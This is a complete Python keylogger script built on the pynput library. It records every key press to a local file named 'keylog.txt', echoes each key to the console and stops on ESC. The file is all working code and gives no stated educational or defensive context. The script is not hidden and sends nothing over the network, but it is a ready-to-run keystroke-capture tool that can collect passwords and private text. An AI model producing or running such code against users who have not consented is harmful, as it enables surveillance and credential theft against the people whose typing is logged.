from pynput.keyboard import Key, Listener

# Global variables
log_file = "keylog.txt"
keys_logged = []

# Function to write to log file
def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press
def on_press(key):
    write_to_log(key)
    keys_logged.append(key)
    print(f"{key} pressed")

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Main function
def main():
    print("Basic Keylogger Running...")
    print("Press ESC to stop logging.")

    # Setup listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
